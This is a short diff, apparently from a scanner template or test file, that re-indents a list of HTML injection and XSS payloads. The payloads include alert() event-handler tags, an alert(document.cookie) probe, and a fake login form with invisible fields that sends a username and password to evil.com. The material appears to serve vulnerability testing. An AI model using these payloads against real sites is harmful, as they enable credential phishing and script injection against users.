@@ -10,9 +10,9 @@ info:
         <h1>HTML Injection : hacked</h1>
         <h1>HTML Injection : hacked</h1>
         <h1>HTML Injection : Fake Login</h1>
-      <svg><animatetransform onbegin=alert(5)>
-<form action="//evil.com" method="GET"><input type="text" name="u" style='opacity:0;'><input type="password" name="p" style='opacity:0;'><input type="submit" name="s" value="Load more content"> "
-<u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+        <svg><animatetransform onbegin=alert(5)>
+        <form action="//evil.com" method="GET"><input type="text" name="u" style='opacity:0;'><input type="password" name="p" style='opacity:0;'><input type="submit" name="s" value="Load more content"> 
+        <u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
         <img src=x onerror=alert(0)>
         <object onerror=javascript:javascript:alert(1)>
     </div>
